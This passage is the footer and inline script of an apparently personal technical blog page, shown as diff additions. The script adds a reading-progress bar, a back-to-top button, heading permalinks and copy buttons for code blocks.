Escalation</a></li> </ul> </aside><button class="to-top" id="to-top" type="button" aria-label="Back to top">↑ top</button>  </main> <footer class="site-footer" data-pagefind-ignore> <div class="inner"> <span>© 2026 ElleuchX1</span> <span> <a href="https://github.com/ElleuchX1">github</a> ·
+<a href="https://twitter.com/ElleuchX1">x</a> ·
+<a href="/rss.xml">rss</a> ·
+<a href="mailto:contact@elleu.ch">mail</a> </span> </div> </footer> </body></html> <script>
+  (function () {
+    // reading progress + back-to-top
+    var bar = document.getElementById('progress');
+    var top = document.getElementById('to-top');
+    function update() {
+      var h = document.documentElement;
+      var max = h.scrollHeight - h.clientHeight;
+      var pct = max > 0 ? h.scrollTop / max : 0;
+      if (bar) bar.style.width = pct * 100 + '%';
+      if (top) top.classList.toggle('show', h.scrollTop > 600);
+    }
+    document.addEventListener('scroll', update, { passive: true });
+    if (top) top.addEventListener('click', function () { window.scrollTo({ top: 0, behavior: 'smooth' }); });
+    update();
+
+    // permalink anchors on headings
+    document.querySelectorAll('.prose h2[id], .prose h3[id]').forEach(function (h) {
+      var a = document.createElement('a');
+      a.className = 'anchor';
+      a.href = '#' + h.id;
+      a.setAttribute('aria-label', 'Link to this section');
+      a.textContent = '#';
+      h.appendChild(a);
+    });
+
+    // code blocks: language label + copy button
+    document.querySelectorAll('.prose pre.astro-code').forEach(function (pre) {
+      var wrap = document.createElement('div');
+      wrap.className = 'code';
+      pre.parentNode.insertBefore(wrap, pre);
+      var bar = document.createElement('div');
+      bar.className = 'code-bar';
+      var lang = pre.getAttribute('data-language') || 'text';
+      var span = document.createElement('span');
+      span.className = 'code-lang';
+      span.textContent = lang;
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'copy';
+      btn.textContent = 'copy';
+      btn.addEventListener('click', function () {
+        var text = pre.innerText;
+        var done = function () { btn.textContent = 'copied'; setTimeout(function () { btn.textContent = 'copy'; }, 1200); };
+        if (navigator.clipboard) { navigator.clipboard.writeText(text).then(done, done); }
+        else {
+          var ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select();
+          try { document.execCommand('copy'); } catch (e) {} ta.remove(); done();
+        }
+      });
+      bar.appendChild(span);
+      bar.appendChild(btn);
+      wrap.appendChild(bar);
+      wrap.appendChild(pre);
+    });
+  })();
+</script>
